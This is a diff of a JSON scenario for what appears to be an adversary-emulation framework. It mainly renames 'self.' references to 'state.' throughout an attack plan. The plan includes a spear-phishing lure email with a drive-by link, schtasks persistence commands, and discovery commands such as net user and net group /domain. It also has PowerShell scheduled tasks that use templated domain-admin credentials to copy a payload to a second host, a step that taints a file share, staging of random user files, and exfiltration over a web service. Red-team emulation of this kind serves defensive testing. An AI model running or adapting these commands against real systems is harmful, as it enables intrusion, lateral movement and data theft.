@@ -13,7 +13,10 @@
             "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
-                "tool": "self.tool_name"
+                "tool": "state.tool_name"
+            },
+            "set_state": {
+                "actuator": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -21,9 +24,9 @@
             "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -31,9 +34,9 @@
             "technique": "DNS",
             "label": "DNS",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -41,11 +44,11 @@
             "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
-                "self.tool_name": "self.tool",
-                "payload": "self.payload_name",
-                "exfiltration": "self.exfil",
-                "driveby": "self.driveby",
-                "driveby_ctl": "self.chimera"
+                "state.tool_name": "state.tool",
+                "payload": "state.payload_name",
+                "exfiltration": "state.exfil",
+                "driveby": "state.driveby",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -53,7 +56,7 @@
             "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
-                "tool": "self.tool"
+                "tool": "state.tool"
             }
         },
         {
@@ -61,14 +64,14 @@
             "technique": "SpearPhishingLink",
             "label": "spearPhishingLink",
             "preconditions": {
-                "actuator": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             },
             "tune": {
-                "body": "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://${self.driveby_domain}/${self.payload_name}.\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
+                "body": "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://${state.driveby_domain}/${state.payload_name}.\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
             }
         },
         {
@@ -76,11 +79,11 @@
             "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
-                "actuator": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -88,11 +91,11 @@
             "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -100,14 +103,17 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             },
             "tune": {
                 "infra": true
+            },
+            "set_state": {
+                "agent_tgt1": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -115,11 +121,11 @@
             "technique": "ValidAccounts_LocalAccounts",
             "label": "validAccounts_LocalAccounts_t1",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target_1": "self.target_1",
-                "target_2": "self.target_1_elevated"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target_1": "state.target_1",
+                "target_2": "state.target_1_elevated"
             }
         },
         {
@@ -127,10 +133,13 @@
             "technique": "WebProtocols",
             "label": "webProtocols_2",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1_elevated"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1_elevated"
+            },
+            "set_state": {
+                "agent_tgt1_elevated": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -138,13 +147,13 @@
             "technique": "ScheduledTaskPersistence",
             "label": "scheduled_task_1",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             },
             "tune": {
-                "command": "schtasks /create /f /tn${self.target_1_elevated_taskname}/tr${self.target_1_elevated_payload_destination}\\${self.payload_name}/sc onlogon"
+                "command": "schtasks /create /f /tn${state.target_1_elevated_taskname}/tr${state.target_1_elevated_payload_destination}\\${state.payload_name}/sc onlogon"
             }
         },
         {
@@ -152,9 +161,9 @@
             "technique": "RegistryRunKeysStartupFolder",
             "label": "Startup_Folder_1",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             }
         },
         {
@@ -162,9 +171,9 @@
             "technique": "SystemOwnerUserDiscovery",
             "label": "systemOwnerUserDiscovery_t1_elevated",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             },
             "tune": {
                 "command": "net user"
@@ -175,9 +184,9 @@
             "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery_t1_elevated",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             },
             "tune": {
                 "command": "net view /all"
@@ -188,9 +197,9 @@
             "technique": "DomainAccount",
             "label": "domainAccount_t1_elevated",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             },
             "tune": {
                 "command": "net user /domain"
@@ -201,9 +210,9 @@
             "technique": "DomainAccount",
             "label": "domainGroups_t1_elevated",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             },
             "tune": {
                 "command": "net group /domain"
@@ -214,9 +223,9 @@
             "technique": "SystemNetworkConnectionsDiscovery",
             "label": "systemNetworkConnectionsDiscovery_t1_elevated",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             },
             "tune": {
                 "command": "netstat -ano"
@@ -227,13 +236,13 @@
             "technique": "ScheduledTask",
             "label": "scheduled_task_2",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target_1": "state.target_1_elevated",
+                "target_2": "state.target_2"
             },
             "tune": {
-                "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /ST 23:58 /sc once /tr cmd.exe /ru${self.target_1_elevated_username}/rp${self.target_1_elevated_password}; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\${self.target_2_hostname}/user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\${self.target_2_hostname}\\c$\\users\\public${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" -user${self.target_1_elevated_username}-password${self.target_1_elevated_password}}"
+                "command": "powershell &{schtasks /create /f /tn \"${state.target_2_taskname}\" /ST 23:58 /sc once /tr cmd.exe /ru${state.target_1_elevated_username}/rp${state.target_1_elevated_password}; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\${state.target_2_hostname}/user:${state.target_2_username}@${state.domain}${state.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\${state.target_2_hostname}\\c$\\users\\public${state.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${state.target_2_taskname}\" -user${state.target_1_elevated_username}-password${state.target_1_elevated_password}}"
             }
         },
         {
@@ -241,14 +250,14 @@
             "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution_1",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target_1": "state.target_1_elevated",
+                "target_2": "state.target_2"
             },
             "tune": {
-                "command": "schtasks /run /tn${self.target_2_taskname}"
+                "command": "schtasks /run /tn${state.target_2_taskname}"
             }
         },
         {
@@ -256,13 +265,13 @@
             "technique": "ScheduledTask",
             "label": "scheduled_task_3",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target_1": "state.target_1_elevated",
+                "target_2": "state.target_2"
             },
             "tune": {
-                "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${self.target_2_taskname}/TR c:\\users\\public\\${self.payload_name}/RL highest /u${self.target_2_username}@${self.domain}/p${self.target_2_password}/ru${self.target_2_username}@${self.domain}/rp${self.target_2_password}/s${self.target_2_hostname}"
+                "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${state.target_2_taskname}/TR c:\\users\\public\\${state.payload_name}/RL highest /u${state.target_2_username}@${state.domain}/p${state.target_2_password}/ru${state.target_2_username}@${state.domain}/rp${state.target_2_password}/s${state.target_2_hostname}"
             }
         },
         {
@@ -270,11 +279,11 @@
             "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution_2",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target_1": "state.target_1_elevated",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -282,10 +291,13 @@
             "technique": "WebProtocols",
             "label": "webProtocols_3",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_2"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_2"
+            },
+            "set_state": {
+                "agent_tgt2": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -293,13 +305,13 @@
             "technique": "TaintSharedContent",
             "label": "taintSharedContent_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target_1": "self.target_2",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target_1": "state.target_2",
+                "target_2": "state.target_2"
             },
             "tune": {
-                "command": "robocopy c:\\users\\public\\ \\\\file\\share${self.payload_name}"
+                "command": "robocopy c:\\users\\public\\ \\\\file\\share${state.payload_name}"
             }
         },
         {
@@ -307,13 +319,13 @@
             "technique": "ScheduledTask",
             "label": "scheduled_task_4",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target_1": "self.target_2",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target_1": "state.target_2",
+                "target_2": "state.target_2"
             },
             "tune": {
-                "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" }"
+                "command": "powershell &{schtasks /create /f /tn \"${state.target_2_taskname}\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${state.target_2_username}@${state.domain}${state.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public${state.payload_name}\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${state.target_2_taskname}\" }"
             }
         },
         {
@@ -321,9 +333,9 @@
             "technique": "LocalDataStaging",
             "label": "localDataStaging_t2_1",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret1.file -force; echo $file}"
@@ -334,9 +346,9 @@
             "technique": "LocalDataStaging",
             "label": "localDataStaging_t2_2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             },
             "tune": {
                 "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret2.file -force; echo $file}"
@@ -347,10 +359,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2_1",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "target": "state.target_2"
             }
         },
         {
@@ -358,10 +370,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2",
-                "exfil": "self.exfil"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2",
+                "exfil": "state.exfil"
             }
         },
         {
@@ -369,10 +381,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1_elevated",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated",
-                "exfil": "self.exfil"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated",
+                "exfil": "state.exfil"
             }
         },
         {
@@ -380,10 +392,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1_1_elevated",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated",
-                "exfil": "self.exfil"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated",
+                "exfil": "state.exfil"
             }
         },
         {
@@ -391,9 +403,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -401,9 +413,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             }
         },
         {
@@ -411,9 +423,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         }
     ],
@@ -455,7 +467,7 @@
             "gtmp.exe"
         ],
         "taskname": [
-            "windowsUpdater82"
+            "windowsUpdater132"
         ]
     },
     "spec": {
@@ -506,7 +518,7 @@
                 "query-target_ip": "172.16.5.101",
                 "query-target_hostname": "dev-win10-1",
                 "payload_destination": "c:\\users\\Public",
-                "ioc-taskname": "host_based_artifacts_74",
+                "ioc-taskname": "host_based_artifacts_23",
                 "persistence_directory": "C:\\Users\\%Username%\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup",
                 "query-target_username": "",
                 "query-target_password": "",
@@ -522,7 +534,7 @@
                     "C:\\users\\public\\secret2.file"
                 ],
                 "payload_destination": "C:\\users\\public",
-                "ioc-taskname": "host_based_artifacts_18",
+                "ioc-taskname": "host_based_artifacts_4",
                 "query-target_username": "",
                 "query-target_password": "",
                 "query-domain_admin_username": "administrator",
@@ -530,180 +542,26 @@
             }
         }
     },
-    "preconditions": {
-        "state": {},
-        "initial": {
-            "tool_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "name"
-                ]
-            },
-            "payload_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "tool": {
-                "path": [
-                    "tool",
-                    "1"
-                ]
-            },
-            "exfil": {
-                "path": [
-                    "exfil",
-                    "1"
-                ]
-            },
-            "driveby": {
-                "path": [
-                    "driveby",
-                    "1"
-                ]
-            },
-            "driveby_domain": {
-                "path": [
-                    "driveby",
-                    "1",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "chimera": {
-                "path": [
-                    "chimera"
-                ]
-            },
-            "phish_1": {
-                "path": [
-                    "phishing",
-                    "1"
-                ]
-            },
-            "target_1": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_1_elevated": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_1_elevated_payload_destination": {
-                "path": [
-                    "targets",
-                    "1",
-                    "payload_destination"
-                ]
-            },
-            "target_1_elevated_taskname": {
-                "path": [
-                    "targets",
-                    "1",
-                    "ioc-taskname"
-                ]
-            },
-            "target_1_elevated_username": {
-                "path": [
-                    "targets",
-                    "1",
-                    "query-domain_admin_username"
-                ]
-            },
-            "target_1_elevated_password": {
-                "path": [
-                    "targets",
-                    "1",
-                    "query-domain_admin_password"
-                ]
-            },
-            "target_2": {
-                "path": [
-                    "targets",
-                    "2"
-                ]
-            },
-            "target_2_username": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-domain_admin_username"
-                ]
-            },
-            "target_2_password": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-domain_admin_password"
-                ]
-            },
-            "target_2_hostname": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-target_hostname"
-                ]
-            },
-            "target_2_taskname": {
-                "path": [
-                    "targets",
-                    "2",
-                    "ioc-taskname"
-                ]
-            },
-            "domain": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-target_domain"
-                ]
-            }
-        },
-        "effects": {
-            "actuator": {
-                "path": [
-                    "actuator",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "scenario_infrastructure": {
-                "path": [
-                    "infrastructure"
-                ]
-            },
-            "agent_tgt1": {
-                "path": [
-                    "webProtocols_1",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            },
-            "agent_tgt1_elevated": {
-                "path": [
-                    "webProtocols_2",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            },
-            "agent_tgt2": {
-                "path": [
-                    "webProtocols_3",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            }
-        }
+    "state": {
+        "tool_name": "spec.tool.1.name",
+        "payload_name": "spec.tool.1.ioc-binary_payload_name",
+        "tool": "spec.tool.1",
+        "exfil": "spec.exfil.1",
+        "driveby": "spec.driveby.1",
+        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
+        "chimera": "spec.chimera",
+        "phish_1": "spec.phishing.1",
+        "target_1": "spec.targets.1",
+        "target_1_elevated": "spec.targets.1",
+        "target_1_elevated_payload_destination": "spec.targets.1.payload_destination",
+        "target_1_elevated_taskname": "spec.targets.1.ioc-taskname",
+        "target_1_elevated_username": "spec.targets.1.query-domain_admin_username",
+        "target_1_elevated_password": "spec.targets.1.query-domain_admin_password",
+        "target_2": "spec.targets.2",
+        "target_2_username": "spec.targets.2.query-domain_admin_username",
+        "target_2_password": "spec.targets.2.query-domain_admin_password",
+        "target_2_hostname": "spec.targets.2.query-target_hostname",
+        "target_2_taskname": "spec.targets.2.ioc-taskname",
+        "domain": "spec.targets.2.query-target_domain"
     }
 }
